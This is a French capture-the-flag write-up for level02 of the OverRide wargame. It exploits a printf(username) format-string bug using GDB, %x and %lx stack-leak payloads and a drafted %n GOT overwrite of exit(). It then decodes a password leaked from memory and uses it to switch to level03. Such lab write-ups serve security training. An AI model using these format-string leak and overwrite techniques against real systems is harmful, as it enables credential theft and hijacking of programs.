Dans GDB, on met un breakpoint juste apres le fread afin de recuperer real_pass
 0x00000000004008f4 <+224>:	mov    edx,0x29
   0x00000000004008f9 <+229>:	mov    esi,0x1
   0x00000000004008fe <+234>:	mov    rdi,rax
   0x0000000000400901 <+237>:	call   0x400690 <fread@plt>
   0x0000000000400906 <+242>:	mov    DWORD PTR [rbp-0xc],eax
---Type <return> to continue, or q <return> to quit---

(gdb) b *0x0000000000400906
Breakpoint 1 at 0x400906
(gdb) r
Starting program: /home/users/level02/level02 
warning: no loadable sections found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
ERROR: failed to open password file
[Inferior 1 (process 1977) exited with code 01]

----NEW----
## La vulnerabilite du code est -> printf(username); // vulnerabilite format String 

L'adresse a viser est ici pour rentrer dans system()
  0x0000000000400a80 <+620>:	call   0x4006c0 <printf@plt>
   0x0000000000400a85 <+625>:	mov    edi,0x400d32
   0x0000000000400a8a <+630>:	call   0x4006b0 <system@plt>
   0x0000000000400a8f <+635>:	mov    eax,0x0

## On repere le direct parameter access :
evel02@OverRide:~$ (python -c 'print("AAAA" + ".%x" * 32)') | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
AAAA.ffffe3e0.0.78.2a2a2a2a.2a2a2a2a.ffffe5d8.f7ff9a08.78.0.0.0.0.0.0.0.0.0.0.0.0.0.34376848.61733951.574e6758.6e475873.664b394d.0.41414141.252e7825.2e78252e.78252e78. does not have access!
level02@OverRide:~$ (python -c 'print("AAAA" + ".%28$x")') | ./level02 
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
AAAA.41414141 does not have access!
C'est la qu'il faut mettre l'adresse ou on va stocker valeur de %n

## On repere l'adresse de GOT(exit)
level02@OverRide:~$ objdump -R level02 

level02:     file format elf64-x86-64

DYNAMIC RELOCATION RECORDS
OFFSET           TYPE              VALUE 
00000000006011b8 R_X86_64_GLOB_DAT  __gmon_start__
0000000000601248 R_X86_64_COPY     stdin
0000000000601250 R_X86_64_COPY     stderr
00000000006011d8 R_X86_64_JUMP_SLOT  strncmp
00000000006011e0 R_X86_64_JUMP_SLOT  puts
00000000006011e8 R_X86_64_JUMP_SLOT  fread
00000000006011f0 R_X86_64_JUMP_SLOT  fclose
00000000006011f8 R_X86_64_JUMP_SLOT  system
0000000000601200 R_X86_64_JUMP_SLOT  printf
0000000000601208 R_X86_64_JUMP_SLOT  strcspn
0000000000601210 R_X86_64_JUMP_SLOT  __libc_start_main
0000000000601218 R_X86_64_JUMP_SLOT  fgets
0000000000601220 R_X86_64_JUMP_SLOT  fopen
0000000000601228 R_X86_64_JUMP_SLOT  exit
0000000000601230 R_X86_64_JUMP_SLOT  fwrite

## On construit un payload
[ adresse_GOT_exit (8 octets) ][ padding ][ %28$n ] // On retire 8 de la taille du padding
(gdb) p 0x0000000000601228 -8
$3 = 6296096

python -c 'print("\x00\x00\x00\x00\x00\x60\x12\x28"[::-1] + "%6296096x" + "%28$n")'

---NEW---
## La vulnerabilite du code est -> printf(username); // vulnerabilite format String 
On va chercher a voir si on a acces aux variables stockes sur la stack et principalement real_pass qui doit contenir la string du .pass
``` bash
level02@OverRide:~$ python -c 'print("%08lx | " * 20)' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
7fffffffe3e0 | 00000000 | 0000006c | 2a2a2a2a2a2a2a2a | 2a2a2a2a2a2a2a2a | 7fffffffe5d8 | 1f7ff9a08 | 383025207c20786c | 383025207c20786c | 383025207c20786c | 383025207c20786c | 383025207c20786c |  does not have access!
```
On a bien acces a la memoire.
On sait que l'espace alloue pour le .pass est de 40 octets soit 5 groupes de 8 octets, et il doit est coherent avec de l'ascii
``` bash
level02@OverRide:~$ python -c 'print("%1$lx | %2$lx | %3$lx | %4$lx | %5$lx | %6$lx | %7$lx | %8$lx | %9$lx | %10$lx")' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
7fffffffe3e0 | 0 | 0 | 2a2a2a2a2a2a2a2a | 2a2a2a2a2a2a2a2a | 7fffffffe5d8 | 1f7ff9a08 | 0 | 0 | 0 does not have access!
level02@OverRide:~$ python -c 'print("%11$lx | %12$lx | %13$lx | %14$lx | %15$lx | %16$lx | %17$lx | %18$lx | %19$lx | %20$lx")' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 0 | 100000000 does not have access!
level02@OverRide:~$ python -c 'print("%21$lx | %22$lx | %23$lx | %24$lx | %25$lx | %26$lx | %27$lx | %28$lx | %29$lx | %30$lx")' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0 | 756e505234376848 | 45414a3561733951 | 377a7143574e6758 | 354a35686e475873 | 48336750664b394d | 0 | 7c20786c24313225 | 20786c2432322520 | 786c24333225207c does not have access!
```
Les codes hexa correspondant a (%22lx -> %26lx) sont assez prometteurs
Une fois concatenes on divise la chaine en groupe de 8 octets(16 hex).
On itere sur chaque groupe, on utilise xxd pour convertir les hexas en l'equivalent ascii, puis on reverse pour la gestion little endian
``` bash
level02@OverRide:~$ python -c 'print("%22$lx%23$lx%24$lx%25$lx%26$lx")' | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d does not have access!

level02@OverRide:~$ echo 756e50523437684845414a3561733951377a7143574e6758354a35686e47587348336750664b394d | fold -w16 | while read block; do echo "$block" | xxd -r -p | rev; done
Hh74RPnu
Q9sa5JAE
XgNWCqz7
sXGnh5J5
M9KfPg3H
level02@OverRide:~$ su level03
Password: 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   /home/users/level03/level03
level03@OverRide:~$ 
```